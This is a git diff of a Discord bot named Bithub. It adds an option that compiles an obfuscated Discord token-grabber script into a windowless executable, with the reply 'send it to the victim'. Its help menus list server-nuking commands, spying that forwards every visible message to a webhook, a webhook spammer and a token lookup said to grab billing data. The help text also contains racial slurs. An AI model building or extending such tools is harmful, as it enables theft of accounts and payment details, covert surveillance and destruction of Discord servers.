@@ -5,11 +5,12 @@ import asyncio
 import requests
 import time
 import random
-import io
+import os
 import base64
 import marshal
 import string
 import socket
+import subprocess
 from config import TOKEN
 from utils.tokeninfo import tokeninfo
 from discord.ext import commands
@@ -23,6 +24,8 @@ from discord.ui import Select
 
 
                 # ================ changelog ================ # 
+                # made help look better
+                # added convert token grabber file to exe
                 # added ip info                
                 # added github profile info 
                 # everything looks better now
@@ -44,6 +47,7 @@ from discord.ui import Select
                 # add badges to token info,skid from https://github.com/Fadi002/Discord-Token-Info/blob/main/src/info.py
                 # add emojis
                 # change every thing to embeds
+                # add convert to exe in token grabber
                 # ================ to do list ================ # 
 
 
@@ -558,13 +562,6 @@ async def purge(ctx, server_id):
         await ctx.reply(embed=embxdd)
 
 
-@bot.command()
-async def help(ctx):
-    help_embed = discord.Embed(title='Bithub V0.2 <:clashroyale:1169203519895638097>', description="", color=discord.Color.orange())
-    help_embed.set_footer(text="Github: x9o | Started - 10/17/2023")
-    view = XOLOVIEW()
-    view.add_item(discord.ui.Button(label="🐈‍⬛",style=discord.ButtonStyle.link,url="https://github.com/x9o"))
-    await ctx.reply(embed=help_embed, view=view)
 
 @bot.command()
 async def leave(ctx, server_id):
@@ -773,8 +770,10 @@ async def avatar(ctx, user: discord.User):
     embed.set_image(url=f"{avatar_url}")
     await ctx.reply(embed=embed)
 
+
+
 @bot.command()
-async def tokengrabber(ctx, webhook, obfus):
+async def tokengrabber(ctx, webhook, obfus, mode):
     if not webhook.startswith("https://discord.com/api/webhooks/"):
         await ctx.reply("Invalid webhook URL.")
         return
@@ -782,21 +781,45 @@ async def tokengrabber(ctx, webhook, obfus):
     with open('utils/grabber.py', 'r') as file:
         content = file.read()
 
-    
     new_content = content.replace('thewebhook', webhook)
 
     if obfus.lower() == "true":
         new_content = obfuscate(new_content)
+
+    if mode.lower() == "exe":
+        await ctx.reply("This make take a while. Please wait patiently.\nNote: The victim does not need to have python to run the file.")
+        
+        temp_file_path = 'exe/temp_script.py'
+        with open(temp_file_path, 'w') as temp_file:
+            temp_file.write(new_content)
+
+        
+        subprocess.call(['pyinstaller', '--onefile', '--noconsole', temp_file_path])
+        file_path = 'dist/temp_script.exe'
     else:
-        new_content = new_content
+        file_path = 'exe/temp_script.py'
+        with open(file_path, 'w') as file:
+            file.write(new_content)
 
+    file = discord.File(file_path, filename='grabber.exe' if mode.lower() == "exe" else 'grabber.py')
 
-    file_object = io.StringIO(new_content)
-    file = discord.File(file_object, filename='tokengrabber.py')
+    await ctx.reply(file=file, content='Rename this and send it to the victim. If it is a python file, victim must have python installed.')
+
+    if mode.lower() == "exe":
+
+        if os.path.exists(file_path):
+            os.remove(file_path)
+        current_directory = os.path.dirname(os.path.abspath(__file__))
+        fp = os.path.join(current_directory, "exe", "temp_script.py")
+        if os.path.exists(fp):
+            os.remove(fp)
+    
 
     
-    await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed.')
 
+    
+
+    
 
 @bot.command()
 async def tokinfo(ctx, token):
@@ -911,33 +934,125 @@ async def ip(ctx, ip):
         
         await ctx.send(embed=helpembed)
 
-      # return country, city, zipcode, isp, timezone, latitude, longtitude, location, hostname, prox, asn, regioname
+      # return country, city, zipcode, isp, callingcode, latitude, longtitude, location, hostname, prox
 
 @bot.command()
-async def dropdownexample(ctx):
+async def help(ctx):
+    helprembed = discord.Embed(title='Bithub V0.2 <:glory:1168889710438010950>', description="", color=discord.Color.gold())
+    helprembed.set_footer(text="Started - 10/17/2023")
+
     select = Select(
-        placeholder = "Test",
+        placeholder = "📃 Choose a category",
         options=[
         discord.SelectOption(
-            label="Day", 
-            emoji="☀️", 
-            description="Test"),
+            label="Nuke", 
+            emoji="💣", 
+            description=""),
         discord.SelectOption(
-            label="Rainy",
-            emoji="☂️", 
-            description="rain"),
+            label="Utils",
+            emoji="🛠️", 
+            description=""),
+        discord.SelectOption(
+            label="Spy",
+            emoji="👁️", 
+            description=""),
+        discord.SelectOption(
+            label="Malicious",
+            emoji="😈", 
+            description=""),
+        discord.SelectOption(
+            label="Misc",
+            emoji="🤠", 
+            description=""),
+        discord.SelectOption(
+            label="Github",
+            emoji="🐈‍⬛", 
+            description=""),
     ])
     
     
     async def callback(interaction):
-        await interaction.response.send_message(f"your {select.values[0]}")
+        if select.values[0] == "Nuke":
+            help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
+            help_embed.add_field(name='💣 Flush', value=f'Nukes server\n`{bot.command_prefix}flush <serverid>`', inline=False)
+            help_embed.add_field(name='🔫 Custom Flush', value=f'Creates channels and messages\n`{bot.command_prefix}customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `{bot.command_prefix}customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
+            help_embed.add_field(name='🗑️ Purge', value=f'Deletes all channels\n`{bot.command_prefix}purge <serverid>`', inline=False)
+            help_embed.add_field(name='😡 Mass Ping', value=f'Use if the bot does not have admin.\n`{bot.command_prefix}massping <serverid> <messageamount> <messagecontent>`', inline=False)
+            help_embed.add_field(name='🧹 Clear Channel', value=f'Deletes all messages in a channel\n`{bot.command_prefix}clearchannel <serverid> <channelid>`', inline=False)
+            help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value=f'`{bot.command_prefix}rolepurge <serverid>`', inline=False)
+            help_embed.add_field(name='🔴 Mass Ban [Broken]', value=f'`{bot.command_prefix}massban <serverid>`', inline=False)
+            help_embed.set_footer(text="Github: x9o")
+
+            await interaction.response.send_message(embed=help_embed, ephemeral=True)
+
+        if select.values[0] == "Utils":
+            helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
+            helpembed.add_field(name='👟 Leave', value=f'Leaves the server\n`{bot.command_prefix}leave <serverid>`', inline=False)
+            helpembed.add_field(name='🔗 Link', value=f'Bot Invite link\n`{bot.command_prefix}link`', inline=False)
+            helpembed.add_field(name='🏫 Server Info', value=f"When you can't get the server ID for some reason.\n`{bot.command_prefix}servinfo`", inline=False)
+            helpembed.add_field(name='📃 Server List', value=f'Shows a list of servers the bot is in for you to nuke.\n`{bot.command_prefix}servlist`', inline=False)
+            helpembed.add_field(name='🧼 Clear', value=f'Deletes all messages sent by the bot\n`{bot.command_prefix}clear <serverid>`', inline=False)
+            helpembed.add_field(name='❗ Set Prefix', value=f'Owner only\n`{bot.command_prefix}setprefix <prefix>`', inline=False)
+            helpembed.add_field(name='🗿 Set Status', value=f'Owner only\n`{bot.command_prefix}setstatus <status>`', inline=False)
+            helpembed.add_field(name='🗣️ Say', value=f'Says some bullshit you want\n`{bot.command_prefix}say <msg>`', inline=False)
+            helpembed.add_field(name='🔨 Ban', value=f'`{bot.command_prefix}ban <userid> <reason>`', inline=False)
+            helpembed.add_field(name='⚒️ UnBan', value=f'`{bot.command_prefix}unban <userid>`', inline=False)
+            helpembed.add_field(name='🥷 DM', value=f'DM someone\n`{bot.command_prefix}dm <userid> <msgcontent>`', inline=False)
+            helpembed.add_field(name=':baby: Avatar', value=f'Check the avatar sum nigga\n`{bot.command_prefix}avatar <user>`', inline=False)
+            helpembed.set_footer(text="Github: x9o")
+
+            await interaction.response.send_message(embed=helpembed, ephemeral=True)
+        
+        if select.values[0] == "Spy":
+            global messagespy
+            global auditlogspy
+            global banspy
+            global userprofilespy
+            global leavespy
+            global deletespy
+            global editspy
+
+            helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
+            helpxembed.add_field(name='💬 Message spy', value=f'Sends EVERY single message the bot has access to from all servers the bot is in.\n🚨 YOUR WEBHOOK MUST BE IN A CHANNEL NAMED "spy" 🚨\n⚠️ MESSAGES WILL NOT BE DETECTED IN THE CHANNEL "spy". ⚠️\n[{bot.command_prefix}messagespytoggle <on/off> <webhook>]\nStatus: {messagespy}', inline=False)
+            helpxembed.add_field(name='📜 Audit log spy', value=f'[{bot.command_prefix}auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
+            helpxembed.add_field(name='🔴 User profile spy [BROKEN]', value=f'Let you know when a user changes anything from their profile.\n[{bot.command_prefix}profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
+            helpxembed.add_field(name='🗡️ Ban spy', value=f'Let you know when a user gets banned.\n[{bot.command_prefix}banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
+            helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[{bot.command_prefix}leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
+            helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[{bot.command_prefix}deletespytoggle]\nStatus: {deletespy} ', inline=False)
+            helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[{bot.command_prefix}editspytoggle]\nStatus: {editspy} ', inline=False)
+            helpxembed.set_footer(text="Github: x9o")
+
+
+            await interaction.response.send_message(embed=helpxembed, ephemeral=True)
+
+        if select.values[0] == "Malicious":
+            helpzembed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
+            helpzembed.add_field(name='🪝 Webhook Spammer', value=f'`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
+            helpzembed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false> <mode: exe/py>`\nObfuscation is recommended for performance.', inline=False)
+            helpzembed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
+            helpzembed.set_footer(text="Github: x9o")
+
+            await interaction.response.send_message(embed=helpzembed, ephemeral=True)
+
+        if select.values[0] == "Misc":
+            xembed = discord.Embed(title='Info', color=discord.Color.blurple())
+            xembed.add_field(name='<:github:1168890688943968256> Github', value=f'Returns information of a github user\n`{bot.command_prefix}github <targetusername>`', inline=False)
+            xembed.add_field(name='<:niggawifi:1169653037804048384> IP Address', value=f'Returns information of an IP address with geolocation\n`{bot.command_prefix}ip <ipaddress>`', inline=False)
+            xembed.set_footer(text="Github: x9o")
+
+            await interaction.response.send_message(embed=xembed, ephemeral=True)
+
+
+        if select.values[0] == "Github":
+            await ctx.reply("🤖 [Bot Repo](https://github.com/x9o/Bithub)\n🐦‍⬛ [Profile](https://github.com/x9o/)")
+            
+
     select.callback = callback
 
     view = discord.ui.View()
     view.add_item(select)
 
-    await ctx.send("wow it works", view=view)
-
+    await ctx.send(embed=helprembed, view=view)
 
 #                                  non bot functions                                      #
 
@@ -946,9 +1061,9 @@ async def dropdownexample(ctx):
 
 def obfuscate(content):
     compiled_code = compile(content, '<string>', 'exec')
-  
+        # Marshal the compiled code
     marshalled_code = marshal.dumps(compiled_code)
-  
+        # Base64 encode the marshalled code
     encoded_code = base64.b64encode(marshalled_code).decode('latin1')
 
     rvn = ''.join(random.choice(string.ascii_letters) for _ in range(5))
@@ -1026,87 +1141,7 @@ def ipinfo(address):
 
 
 
-class XOLOVIEW(discord.ui.View):
-    @discord.ui.button(label="☢️",
-                       style=discord.ButtonStyle.grey)
-    async def nig(self, interaction: discord.Interaction, button: discord.ui.Button):
-        help_embed = discord.Embed(title='Nuking', color=discord.Color.red())
-        help_embed.add_field(name='💣 Flush', value=f'Nukes server\n`{bot.command_prefix}flush <serverid>`', inline=False)
-        help_embed.add_field(name='🔫 Custom Flush', value=f'Creates channels and messages\n`{bot.command_prefix}customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `{bot.command_prefix}customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
-        help_embed.add_field(name='🗑️ Purge', value=f'Deletes all channels\n`{bot.command_prefix}purge <serverid>`', inline=False)
-        help_embed.add_field(name='😡 Mass Ping', value=f'Use if the bot does not have admin.\n`{bot.command_prefix}massping <serverid> <messageamount> <messagecontent>`', inline=False)
-        help_embed.add_field(name='🧹 Clear Channel', value=f'Deletes all messages in a channel\n`{bot.command_prefix}clearchannel <serverid> <channelid>`', inline=False)
-        help_embed.add_field(name='🚮 Role Purge (Cannot delete roles above the bot)', value=f'`{bot.command_prefix}rolepurge <serverid>`', inline=False)
-        help_embed.add_field(name='🔴 Mass Ban [Broken]', value=f'`{bot.command_prefix}massban <serverid>`', inline=False)
-        help_embed.set_footer(text="Github: x9o")
 
-        await interaction.response.send_message(embed=help_embed, ephemeral=True)
-
-    @discord.ui.button(label="🛠️",
-                       style=discord.ButtonStyle.grey)
-    async def niga(self, interaction: discord.Interaction, button: discord.ui.Button):
-        helpembed = discord.Embed(title='Utilities', color=discord.Color.green())
-        helpembed.add_field(name='👟 Leave', value=f'Leaves the server\n`{bot.command_prefix}leave <serverid>`', inline=False)
-        helpembed.add_field(name='🔗 Link', value=f'Bot Invite link\n`{bot.command_prefix}link`', inline=False)
-        helpembed.add_field(name='🏫 Server Info', value=f"When you can't get the server ID for some reason.\n`{bot.command_prefix}servinfo`", inline=False)
-        helpembed.add_field(name='📃 Server List', value=f'Shows a list of servers the bot is in for you to nuke.\n`{bot.command_prefix}servlist`', inline=False)
-        helpembed.add_field(name='🧼 Clear', value=f'Deletes all messages sent by the bot\n`{bot.command_prefix}clear <serverid>`', inline=False)
-        helpembed.add_field(name='❗ Set Prefix', value=f'Owner only\n`{bot.command_prefix}setprefix <prefix>`', inline=False)
-        helpembed.add_field(name='🗿 Set Status', value=f'Owner only\n`{bot.command_prefix}setstatus <status>`', inline=False)
-        helpembed.add_field(name='🗣️ Say', value=f'Says some bullshit you want\n`{bot.command_prefix}say <msg>`', inline=False)
-        helpembed.add_field(name='🔨 Ban', value=f'`{bot.command_prefix}ban <userid> <reason>`', inline=False)
-        helpembed.add_field(name='⚒️ UnBan', value=f'`{bot.command_prefix}unban <userid>`', inline=False)
-        helpembed.add_field(name='🥷 DM', value=f'DM someone\n`{bot.command_prefix}dm <userid> <msgcontent>`', inline=False)
-        helpembed.add_field(name=':baby: Avatar', value=f'Check the avatar sum nigga\n`{bot.command_prefix}avatar <user>`', inline=False)
-        helpembed.set_footer(text="Github: x9o")
-
-        await interaction.response.send_message(embed=helpembed, ephemeral=True)
-
-    @discord.ui.button(label="👁️",
-                       style=discord.ButtonStyle.grey)
-    async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
-        global messagespy
-        global auditlogspy
-        global banspy
-        global userprofilespy
-        global leavespy
-        global deletespy
-        global editspy
-        helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
-        helpxembed.add_field(name='💬 Message spy', value=f'Sends EVERY single message the bot has access to from all servers the bot is in.\n🚨 YOUR WEBHOOK MUST BE IN A CHANNEL NAMED "spy" 🚨\n⚠️ MESSAGES WILL NOT BE DETECTED IN THE CHANNEL "spy". ⚠️\n[{bot.command_prefix}messagespytoggle <on/off> <webhook>]\nStatus: {messagespy}', inline=False)
-        helpxembed.add_field(name='📜 Audit log spy', value=f'[{bot.command_prefix}auditspytoggle <on/off>]\nStatus: {auditlogspy}', inline=False)
-        helpxembed.add_field(name='🔴 User profile spy [BROKEN]', value=f'Let you know when a user changes anything from their profile.\n[{bot.command_prefix}profilespytoggle <on/off>]\nStatus: {userprofilespy}', inline=False)
-        helpxembed.add_field(name='🗡️ Ban spy', value=f'Let you know when a user gets banned.\n[{bot.command_prefix}banspytoggle <on/off>]\nStatus: {banspy} ', inline=False)
-        helpxembed.add_field(name='🏃 Leave spy', value=f'Useless ass feature\n[{bot.command_prefix}leavespytoggle <on/off>]\nStatus: {leavespy} ', inline=False)
-        helpxembed.add_field(name='🗑️ Spy deleted messages', value=f'Let you know when a message gets deleted.\n[{bot.command_prefix}deletespytoggle]\nStatus: {deletespy} ', inline=False)
-        helpxembed.add_field(name='✍️ Spy edited messsages', value=f'Let you know when someone edits a message.\n[{bot.command_prefix}editspytoggle]\nStatus: {editspy} ', inline=False)
-        helpxembed.set_footer(text="Github: x9o")
-
-
-        await interaction.response.send_message(embed=helpxembed, ephemeral=True)
-
-
-    @discord.ui.button(label="😈",
-                       style=discord.ButtonStyle.grey)
-    async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
-        help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
-        help_embed.add_field(name='🪝 Webhook Spammer', value=f'Spams a webhook until it gets rate limited asf\n`{bot.command_prefix}webhookspam <webhook> <msgcontent>`', inline=False)
-        help_embed.add_field(name='🎠 Token grabber generator', value=f'Generates a token grabber in python. Also grabs IP, HWID, etc.\n`{bot.command_prefix}tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
-        help_embed.add_field(name='💸 Token Information', value=f'Provides full information on a user token. Billing info will also be grabbed if any.\n`{bot.command_prefix}tokinfo <token>`', inline=False)
-        help_embed.set_footer(text="Github: x9o")
-
-        await interaction.response.send_message(embed=help_embed, ephemeral=True)
-
-
-    @discord.ui.button(label="🪪",
-                       style=discord.ButtonStyle.grey)
-    async def nigxr(self, interaction: discord.Interaction, button: discord.ui.Button):
-        xembed = discord.Embed(title='Info', color=discord.Color.gre())
-        xembed.add_field(name='<:github:1168890688943968256> Github', value=f'Returns information of a github user\n`{bot.command_prefix}github <targetusername>`', inline=False)
-        xembed.add_field(name='<:niggawifi:1169653037804048384> IP Address', value=f'Returns information of an IP address with geolocation\n`{bot.command_prefix}ip <ipaddress>`', inline=False)
-        xembed.set_footer(text="Github: x9o")
-
-        await interaction.response.send_message(embed=xembed, ephemeral=True)
 
 
         
